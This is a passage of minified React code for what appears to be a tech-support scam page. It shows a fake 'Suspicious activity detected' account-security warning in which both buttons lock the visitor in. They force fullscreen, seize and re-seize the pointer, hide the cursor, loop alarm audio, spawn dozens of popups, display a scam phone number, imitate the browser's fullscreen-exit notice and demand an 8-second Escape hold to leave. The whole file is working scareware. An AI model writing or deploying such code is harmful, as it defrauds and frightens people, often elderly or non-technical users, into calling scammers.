                  style: { width: 36, height: 36, color: "#f9bc06" },
                  children: s.jsx("svg", {
                    viewBox: "0 0 24 24",
                    fill: "currentColor",
                    children: s.jsx("path", {
                      d: "M12 17a2 2 0 100-4 2 2 0 000 4zm6-9h-1V6a5 5 0 00-10 0v2H6a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V10a2 2 0 00-2-2zM9 6a3 3 0 016 0v2H9V6zm10 14H5V10h14v10z",
                    }),
                  }),
                }),
            ],
          }),
          s.jsx("div", {
            style: { fontSize: 13, color: "#374151", lineHeight: 1.4 },
            children: E.content,
          }),
        ],
      }),
    ],
  });
}
function Sy() {
  const [E, H] = bl.useState(!1),
    [G, v] = bl.useState([]),
    [O, V] = bl.useState(0),
    [sl, Ol] = bl.useState(!1),
    [D, T] = bl.useState(!0),
    [I, R] = bl.useState(!1),
    [rl, Ql] = bl.useState(!1),
    [Zl, Cl] = bl.useState({
      x: window.innerWidth / 2,
      y: window.innerHeight / 2,
    }),
    [Kl, Hl] = bl.useState(!1),
    [_t, Ml] = bl.useState(!1),
    [Rl, yt] = bl.useState("+1 (000) 000-0000"),
    [Bl, K] = bl.useState(!0);
  bl.useEffect(() => {
    fetch("./data.txt?t=" + Date.now())
      .then((q) => q.text())
      .then((q) => {
        const Q = q
          .trim()
          .split(
            `
`
          )
          .map((ml) => ml.trim());
        Q[0] && yt(Q[0]), Q[1] !== void 0 && K(Q[1].toLowerCase() !== "off");
      })
      .catch(() => {});
  }, []),
    bl.useEffect(() => {
      if (!Bl) return;
      let q = null,
        Q = null;
      if (O === 1) {
        (q = new Audio("./NtUGN1dKiCUr.mp3.mpeg")),
          (Q = new Audio("./LhlCcb3bW5w3.mp3.mpeg")),
          (Q.loop = !0);
        const ml = () => {
          Q.play().catch(() => {});
        };
        return (
          q.addEventListener("ended", ml),
          q.play().catch(() => {}),
          () => {
            q.pause(),
              q.removeEventListener("ended", ml),
              Q.pause(),
              (q = null),
              (Q = null);
          }
        );
      }
    }, [O, Bl]);
  const Nl = (q) => {
      const Q = document.documentElement;
      Q.requestFullscreen && Q.requestFullscreen().catch(() => {}),
        Cl({ x: q.clientX, y: q.clientY }),
        H(!0),
        V(1);
    },
    ht = () => {
      document.exitFullscreen && document.exitFullscreen().catch(() => {}),
        document.exitPointerLock && document.exitPointerLock(),
        V(0),
        Ol(!1),
        T(!1),
        R(!1),
        Ql(!1),
        v([]),
        H(!1),
        Hl(!1),
        Ml(!1);
    };
  bl.useEffect(() => {
    if (O < 1) return;
    const q = (Q) => Cl({ x: Q.clientX, y: Q.clientY });
    return (
      window.addEventListener("mousemove", q, !0),
      () => window.removeEventListener("mousemove", q, !0)
    );
  }, [O]),
    bl.useEffect(() => {
      let q = null;
      const Q = (Jl) => {
          O >= 1 &&
            Jl.key === "Escape" &&
            !Kl &&
            (Hl(!0), (q = setTimeout(() => ht(), 8e3)));
        },
        ml = (Jl) => {
          Jl.key === "Escape" && (Hl(!1), q && (clearTimeout(q), (q = null)));
        };
      return (
        window.addEventListener("keydown", Q, !0),
        window.addEventListener("keyup", ml, !0),
        () => {
          window.removeEventListener("keydown", Q, !0),
            window.removeEventListener("keyup", ml, !0),
            q && clearTimeout(q);
        }
      );
    }, [O, Kl]),
    bl.useEffect(() => {
      if (O < 1) return;
      const q = () => {
          O >= 1 &&
            !document.pointerLockElement &&
            document.documentElement.requestPointerLock &&
            document.documentElement.requestPointerLock();
        },
        Q = () => {
          O >= 1 &&
            !document.pointerLockElement &&
            !Kl &&
            setTimeout(() => {
              O >= 1 &&
                document.documentElement.requestPointerLock &&
                document.documentElement.requestPointerLock();
            }, 100);
        },
        ml = setTimeout(() => {
          document.documentElement.requestPointerLock &&
            document.documentElement.requestPointerLock();
        }, 1e3);
      return (
        window.addEventListener("mousedown", q, !0),
        document.addEventListener("pointerlockchange", Q),
        () => {
          clearTimeout(ml),
            window.removeEventListener("mousedown", q, !0),
            document.removeEventListener("pointerlockchange", Q);
        }
      );
    }, [O, Kl]),
    bl.useEffect(() => {
      if (O !== 1) return;
      let q = null;
      const Q = setTimeout(() => {
        let ml = 0;
        const Jl = 24,
          kl = () => {
            if (ml >= Jl) {
              setTimeout(() => {
                Ml(!0),
                  setTimeout(() => {
                    Ql(!0),
                      Ol(!0),
                      setTimeout(() => {
                        R(!0);
                      }, 500);
                  }, 625);
              }, 1e3);
              return;
            }
            const S = A0[Math.floor(Math.random() * A0.length)];
            v((N) => [
              ...N,
              {
                id: Date.now() + Math.random(),
                title: S.title,
                content: S.content,
                type: S.type,
                style: {
                  top: `${Math.random() * 80 + 5}vh`,
                  left: `${Math.random() * 75 + 5}vw`,
                },
              },
            ]),
              ml++;
            const A = Math.random() * 100 + 30;
            q = setTimeout(kl, A);
          };
        kl();
      }, 1400);
      return () => {
        clearTimeout(Q), q && clearTimeout(q);
      };
    }, [O]);
  const Ft = (q) => v((Q) => Q.filter((ml) => ml.id !== q));
  return s.jsxs("div", {
    style: {
      position: "relative",
      width: "100vw",
      height: "100vh",
      overflow: "hidden",
      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
      cursor: O >= 1 ? "none" : "default",
    },
    children: [
      s.jsx("div", {
        style: { position: "absolute", inset: 0, transition: "all 1s" },
        children:
          O === 0
            ? s.jsx("div", {
                style: {
                  position: "absolute",
                  inset: 0,
                  backgroundImage: `url(${iy})`,
                  backgroundSize: "cover",
                  backgroundPosition: "center",
                  filter: "grayscale(20%)",
                  transform: "scale(1.02)",
                },
              })
            : s.jsx(sy, {}),
      }),
      O === 0 &&
        s.jsx("div", {
          style: {
            position: "fixed",
            inset: 0,
            zIndex: 2e3,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            background: "rgba(0,0,0,0.1)",
            padding: "0 16px",
          },
          children: s.jsxs("div", {
            style: {
              background: "#fff",
              width: "100%",
              maxWidth: 500,
              borderRadius: 8,
              boxShadow: "0 25px 50px rgba(0,0,0,0.25)",
              overflow: "hidden",
              border: "1px solid #f3f4f6",
              animation: "fadeIn 0.3s ease",
            },
            children: [
              s.jsxs("div", {
                style: {
                  padding: "8px 12px",
                  display: "flex",
                  justifyContent: "space-between",
                  alignItems: "center",
                  borderBottom: "1px solid #f3f4f6",
                },
                children: [
                  s.jsx(cy, {}),
                  s.jsx("span", {
                    style: {
                      fontSize: 12,
                      fontWeight: 600,
                      color: "#6b7280",
                      letterSpacing: 2,
                      textTransform: "uppercase",
                    },
                    children: "Account Security",
                  }),
                ],
              }),
              s.jsxs("div", {
                style: { padding: 32 },
                children: [
                  s.jsxs("div", {
                    style: {
                      display: "flex",
                      alignItems: "flex-start",
                      gap: 24,
                      marginBottom: 32,
                    },
                    children: [
                      s.jsx("div", {
                        style: {
                          background: "#fef3c7",
                          padding: 12,
                          borderRadius: "50%",
                          flexShrink: 0,
                        },
                        children: s.jsxs("svg", {
                          style: {
                            width: 32,
                            height: 32,
                            color: "#f59e0b",
                            display: "block",
                          },
                          viewBox: "0 0 24 24",
                          fill: "none",
                          stroke: "currentColor",
                          strokeWidth: "2",
                          strokeLinecap: "round",
                          strokeLinejoin: "round",
                          children: [
                            s.jsx("path", {
                              d: "M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z",
                            }),
                            s.jsx("line", {
                              x1: "12",
                              y1: "9",
                              x2: "12",
                              y2: "13",
                            }),
                            s.jsx("line", {
                              x1: "12",
                              y1: "17",
                              x2: "12.01",
                              y2: "17",
                            }),
                          ],
                        }),
                      }),
                      s.jsxs("div", {
                        children: [
                          s.jsx("h2", {
                            style: {
                              fontSize: 20,
                              fontWeight: 700,
                              color: "#1f2937",
                              marginBottom: 8,
                            },
                            children: "Suspicious activity detected",
                          }),
                          s.jsxs("p", {
                            style: {
                              fontSize: 14,
                              color: "#4b5563",
                              lineHeight: 1.6,
                              marginBottom: 16,
                            },
                            children: [
                              "An unusual login attempt has been detected on your account from IP address",
                              " ",
                              s.jsx("strong", {
                                style: { color: "#111827" },
                                children: "104.244.42.1",
                              }),
                              " (United States).",
                            ],
                          }),
                          s.jsx("p", {
                            style: {
                              fontSize: 14,
                              color: "#4b5563",
                              lineHeight: 1.6,
                            },
                            children:
                              "To protect your personal information, please confirm your identity or close this page immediately.",
                          }),
                        ],
                      }),
                    ],
                  }),
                  s.jsxs("div", {
                    style: {
                      display: "flex",
                      gap: 12,
                      justifyContent: "flex-end",
                    },
                    children: [
                      s.jsx("button", {
                        onClick: Nl,
                        style: {
                          padding: "8px 24px",
                          background: "#e5e7eb",
                          border: "none",
                          borderRadius: 4,
                          fontSize: 14,
                          cursor: "pointer",
                          color: "#374151",
                          fontWeight: 700,
                        },
                        children: "Close this page",
                      }),
                      s.jsx("button", {
                        onClick: Nl,
                        style: {
                          padding: "8px 24px",
                          background: "#6001d2",
                          border: "none",
                          borderRadius: 4,
                          fontSize: 14,
                          color: "#fff",
                          fontWeight: 700,
                          cursor: "pointer",
                          boxShadow: "0 4px 6px rgba(96,1,210,0.3)",
                        },
                        children: "Confirm my identity",
                      }),
                    ],
                  }),
                ],
              }),
            ],
          }),
        }),
      O >= 1 &&
        s.jsxs("div", {
          style: {
            position: "fixed",
            inset: 0,
            width: "100vw",
            height: "100vh",
          },
          children: [
            Kl &&
              s.jsxs("div", {
                style: {
                  position: "fixed",
                  top: 20,
                  left: "50%",
                  transform: "translateX(-50%)",
                  background: "rgba(0,0,0,0.85)",
                  color: "#fff",
                  padding: "10px 24px",
                  borderRadius: 6,
                  fontSize: 14,
                  zIndex: 99998,
                  display: "flex",
                  alignItems: "center",
                  gap: 12,
                },
                children: [
                  s.jsxs("span", {
                    children: [
                      window.location.hostname,
                      " – 若要退出全屏模式，请按",
                    ],
                  }),
                  s.jsx("kbd", {
                    style: {
                      background: "#555",
                      padding: "2px 8px",
                      borderRadius: 3,
                      fontFamily: "monospace",
                    },
                    children: "esc",
                  }),
                ],
              }),
            !sl &&
              s.jsxs("div", {
                style: {
                  position: "relative",
                  zIndex: 5e3,
                  width: "100%",
                  height: "100%",
                },
                children: [
                  s.jsx(oy, { style: { top: "10%", right: "5%" } }),
                  D && s.jsx(dy, { style: { top: "15%", left: "15%" } }),
                ],
              }),
            s.jsx("div", {
              style: {
                position: "absolute",
                inset: 0,
                zIndex: 8e3,
                pointerEvents: "none",
              },
              children: G.map((q) =>
                s.jsx(gy, { popup: q, onClose: Ft }, q.id)
              ),
            }),
            rl &&
              s.jsx("div", {
                style: {
                  position: "fixed",
                  inset: 0,
                  zIndex: 8500,
                  pointerEvents: "none",
                },
                children: s.jsx(hy, {
                  style: { bottom: "2vh", left: "2vw" },
                  phone: Rl,
                }),
              }),
            (sl || I) &&
              s.jsxs("div", {
                style: {
                  position: "fixed",
                  inset: 0,
                  zIndex: 9e3,
                  pointerEvents: "auto",
                  background: "rgba(0,0,0,0.2)",
                },
                children: [
                  sl &&
                    s.jsx(ry, {
                      style: { top: "15vh", left: "3vw" },
                      phone: Rl,
                    }),
                  I &&
                    s.jsx(yy, {
                      style: { top: "15vh", left: "40vw" },
                      phone: Rl,
                    }),
                ],
              }),
            _t && s.jsx(my, { phone: Rl }),
          ],
        }),
      O >= 1 && s.jsx(vy, { pos: Zl }),
    ],
  });
}
ny.createRoot(document.getElementById("root")).render(s.jsx(Sy, {}));
